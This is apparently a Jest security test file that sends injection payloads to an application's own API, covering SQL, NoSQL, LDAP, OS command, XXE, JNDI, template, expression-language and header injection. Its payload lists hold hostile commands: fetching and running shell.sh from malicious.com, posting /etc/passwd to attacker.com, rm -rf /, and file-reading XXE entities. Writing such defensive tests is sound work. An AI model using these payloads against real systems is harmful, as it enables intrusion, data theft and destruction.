import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import axios from 'axios';

// Security tests for various injection vulnerabilities
describe('Injection Vulnerability Tests', () => {
  const baseUrl = global.SECURITY_CONFIG.baseUrl;
  const mockCreds = global.MOCK_CREDENTIALS;
  
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Injection Protection', () => {
    it('should prevent SQL injection in search queries', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE programs; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM users)) --",
        "' OR 1=1#",
        "' OR 'a'='a",
        "1'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1 LIMIT 1 OFFSET 1 --",
        "'; UPDATE users SET password='hacked' WHERE id=1; --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await axios.get(`${baseUrl}/api/programs/search`, {
          params: { query: payload },
          headers: {
            'Authorization': `Bearer ${mockCreds.validToken}`,
          },
          validateStatus: () => true,
        });
        
        // Should not return SQL errors or execute malicious queries
        expect(response.status).not.toBe(500);
        if (response.data.error) {
          expect(response.data.error).not.toMatch(/SQL|syntax|database|table|column/i);
        }
      }
    });

    it('should use parameterized queries for user inputs', async () => {
      // Test various user input fields for SQL injection
      const testEndpoints = [
        {
          endpoint: '/api/programs',
          method: 'POST',
          data: { name: "Test'; DROP TABLE programs; --", description: 'Test program' },
        },
        {
          endpoint: '/api/analysis',
          method: 'POST', 
          data: { programId: 1, config: { name: "'; DELETE FROM analysis; --" }},
        },
        {
          endpoint: '/api/programs/1',
          method: 'PUT',
          data: { name: 'Normal', description: "'; TRUNCATE TABLE users; --" },
        },
      ];

      for (const test of testEndpoints) {
        const response = await axios.request({
          method: test.method,
          url: `${baseUrl}${test.endpoint}`,
          data: test.data,
          headers: {
            'Authorization': `Bearer ${mockCreds.validToken}`,
          },
          validateStatus: () => true,
        });

        // Should handle malicious input gracefully without SQL errors
        if (response.status >= 500) {
          expect(response.data.error).not.toMatch(/SQL|database|table|syntax/i);
        }
      }
    });

    it('should prevent second-order SQL injection', async () => {
      // First, insert potentially malicious data
      const maliciousData = "admin'; DROP TABLE programs; --";
      
      const createResponse = await axios.post(`${baseUrl}/api/programs`, {
        name: maliciousData,
        description: 'Test program',
      }, {
        headers: {
          'Authorization': `Bearer ${mockCreds.validToken}`,
        },
        validateStatus: () => true,
      });

      if (createResponse.status === 200 || createResponse.status === 201) {
        const programId = createResponse.data.id;
        
        // Then try to retrieve it (which might trigger second-order injection)
        const retrieveResponse = await axios.get(`${baseUrl}/api/programs/${programId}`, {
          headers: {
            'Authorization': `Bearer ${mockCreds.validToken}`,
          },
          validateStatus: () => true,
        });

        expect(retrieveResponse.status).not.toBe(500);
        if (retrieveResponse.data.error) {
          expect(retrieveResponse.data.error).not.toMatch(/SQL|database|syntax/i);
        }
      }
    });
  });

  describe('NoSQL Injection Protection', () => {
    it('should prevent MongoDB injection attacks', async () => {
      const noSqlInjectionPayloads = [
        { '$ne': null },
        { '$gt': '' },
        { '$regex': '.*' },
        { '$where': 'this.password == this.username' },
        { '$or': [{ 'password': '' }, { 'password': { '$exists': false }}]},
        { 'username': { '$in': ['admin', 'administrator'] }},
        { '$eval': 'db.users.find()' },
      ];

      for (const payload of noSqlInjectionPayloads) {
        const responses = await Promise.all([
          // Test in query parameters
          axios.get(`${baseUrl}/api/programs`, {
            params: { filter: JSON.stringify(payload) },
            headers: { 'Authorization': `Bearer ${mockCreds.validToken}` },
            validateStatus: () => true,
          }),
          // Test in POST body
          axios.post(`${baseUrl}/api/programs/search`, {
            criteria: payload,
          }, {
            headers: { 'Authorization': `Bearer ${mockCreds.validToken}` },
            validateStatus: () => true,
          }),
        ]);

        for (const response of responses) {
          expect(response.status).not.toBe(500);
          if (response.data.error) {
            expect(response.data.error).not.toMatch(/mongo|eval|where|\$ne|\$gt/i);
          }
        }
      }
    });
  });

  describe('LDAP Injection Protection', () => {
    it('should prevent LDAP injection in authentication', async () => {
      const ldapInjectionPayloads = [
        'admin)(|(password=*))',
        'admin*)((|password=*)',
        '*)(&(objectClass=*)',
        'admin)(cn=*',
        '*)((|userPassword=*)',
        'admin)(!(&(1=0',
        '*)((|uid=*)',
      ];

      for (const payload of ldapInjectionPayloads) {
        const response = await axios.post(`${baseUrl}/api/auth/login`, {
          email: payload,
          password: 'password',
        }, {
          validateStatus: () => true,
        });

        expect(response.status).toBe(400);
        expect(response.data.error).not.toMatch(/LDAP|directory|attribute/i);
      }
    });
  });

  describe('Command Injection Protection', () => {
    it('should prevent OS command injection', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '&& cat /etc/passwd',
        '| whoami',
        '`id`',
        '$(whoami)',
        '; rm -rf /',
        '& dir',
        '|| type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '; wget http://malicious.com/shell.sh; chmod +x shell.sh; ./shell.sh',
        '`curl -d @/etc/passwd http://attacker.com`',
      ];

      for (const payload of commandInjectionPayloads) {
        const testCases = [
          {
            endpoint: '/api/documents/convert',
            data: { filename: payload, format: 'pdf' },
          },
          {
            endpoint: '/api/analysis/export',
            data: { format: payload, programId: 1 },
          },
          {
            endpoint: '/api/programs/import', 
            data: { source: payload, format: 'csv' },
          },
        ];

        for (const testCase of testCases) {
          const response = await axios.post(`${baseUrl}${testCase.endpoint}`, testCase.data, {
            headers: {
              'Authorization': `Bearer ${mockCreds.validToken}`,
            },
            validateStatus: () => true,
          });

          // Should not execute system commands
          expect(response.status).not.toBe(500);
          if (response.data.error) {
            expect(response.data.error).not.toMatch(/command|shell|bash|cmd|exec/i);
          }
        }
      }
    });
  });

  describe('XML/XXE Injection Protection', () => {
    it('should prevent XML External Entity (XXE) attacks', async () => {
      const xxePayloads = [
        `<?xml version="1.0" encoding="ISO-8859-1"?>
         <!DOCTYPE foo [<!ELEMENT foo ANY>
         <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
         <foo>&xxe;</foo>`,
        `<?xml version="1.0"?>
         <!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]>
         <data>&file;</data>`,
        `<?xml version="1.0"?>
         <!DOCTYPE data [<!ENTITY xxe SYSTEM "http://malicious.com/evil.dtd">]>
         <data>&xxe;</data>`,
      ];

      for (const payload of xxePayloads) {
        const response = await axios.post(`${baseUrl}/api/documents/upload`, payload, {
          headers: {
            'Authorization': `Bearer ${mockCreds.validToken}`,
            'Content-Type': 'application/xml',
          },
          validateStatus: () => true,
        });

        // Should not process external entities
        if (response.data && typeof response.data === 'string') {
          expect(response.data).not.toMatch(/root:|localhost|127\.0\.0\.1/);
          expect(response.data).not.toContain('/etc/passwd');
          expect(response.data).not.toContain('/etc/hosts');
        }
      }
    });
  });

  describe('JNDI Injection Protection', () => {
    it('should prevent JNDI injection attacks', async () => {
      const jndiPayloads = [
        '${jndi:ldap://malicious.com/evil}',
        '${jndi:dns://attacker.com/}',
        '${jndi:rmi://evil.com:1099/evil}',
        '${${env:ENV_NAME:-j}ndi:ldap://attacker.com/a}',
        '${jndi:${lower:l}${lower:d}ap://malicious.com/evil}',
      ];

      for (const payload of jndiPayloads) {
        const testCases = [
          { endpoint: '/api/programs', data: { name: payload, description: 'test' }},
          { endpoint: '/api/analysis/config', data: { setting: payload, value: 'test' }},
          { endpoint: '/api/logs', data: { message: payload, level: 'info' }},
        ];

        for (const testCase of testCases) {
          const response = await axios.post(`${baseUrl}${testCase.endpoint}`, testCase.data, {
            headers: {
              'Authorization': `Bearer ${mockCreds.validToken}`,
            },
            validateStatus: () => true,
          });

          // Should not process JNDI expressions
          if (response.status === 200 || response.status === 201) {
            const responseText = JSON.stringify(response.data);
            expect(responseText).not.toMatch(/\$\{jndi:/);
          }
        }
      }
    });
  });

  describe('Template Injection Protection', () => {
    it('should prevent server-side template injection (SSTI)', async () => {
      const sstiPayloads = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config.items()}}',
        '{{request.application.__globals__.__builtins__.__import__("os").system("ls")}}',
        '${"".getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")}',
        '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'whoami\')")()}}',
      ];

      for (const payload of sstiPayloads) {
        const response = await axios.post(`${baseUrl}/api/reports/template`, {
          template: payload,
          data: { test: 'value' },
        }, {
          headers: {
            'Authorization': `Bearer ${mockCreds.validToken}`,
          },
          validateStatus: () => true,
        });

        // Should not execute template expressions
        if (response.data && typeof response.data === 'string') {
          expect(response.data).not.toBe('49'); // 7*7 result
          expect(response.data).not.toMatch(/root|admin|system/);
        }
      }
    });
  });

  describe('Expression Language Injection Protection', () => {
    it('should prevent Expression Language (EL) injection', async () => {
      const elInjectionPayloads = [
        '${1+1}',
        '#{1+1}',
        '${T(java.lang.System).getProperty("user.name")}',
        '${T(java.lang.Runtime).getRuntime().exec("whoami")}',
        '#{request.getSession().setAttribute("admin", true)}',
      ];

      for (const payload of elInjectionPayloads) {
        const response = await axios.post(`${baseUrl}/api/programs`, {
          name: 'Test Program',
          description: payload,
        }, {
          headers: {
            'Authorization': `Bearer ${mockCreds.validToken}`,
          },
          validateStatus: () => true,
        });

        // Should not evaluate expressions
        if (response.status === 200 || response.status === 201) {
          expect(response.data.description).not.toBe('2'); // 1+1 result
          expect(response.data.description).toContain(payload); // Should be stored as literal
        }
      }
    });
  });

  describe('Header Injection Protection', () => {
    it('should prevent HTTP header injection', async () => {
      const headerInjectionPayloads = [
        'test\r\nSet-Cookie: admin=true',
        'test\nLocation: http://malicious.com',
        'test\r\n\r\n<script>alert("xss")</script>',
        'test%0d%0aSet-Cookie: hacked=true',
        'test%0a%0d%0a%0d<html><body>Injected</body></html>',
      ];

      for (const payload of headerInjectionPayloads) {
        const response = await axios.get(`${baseUrl}/api/programs`, {
          headers: {
            'Authorization': `Bearer ${mockCreds.validToken}`,
            'X-Custom-Header': payload,
          },
          validateStatus: () => true,
        });

        // Check that injected headers are not present in response
        expect(response.headers['set-cookie']).not.toContain('admin=true');
        expect(response.headers['set-cookie']).not.toContain('hacked=true');
        expect(response.headers['location']).not.toContain('malicious.com');
      }
    });
  });
});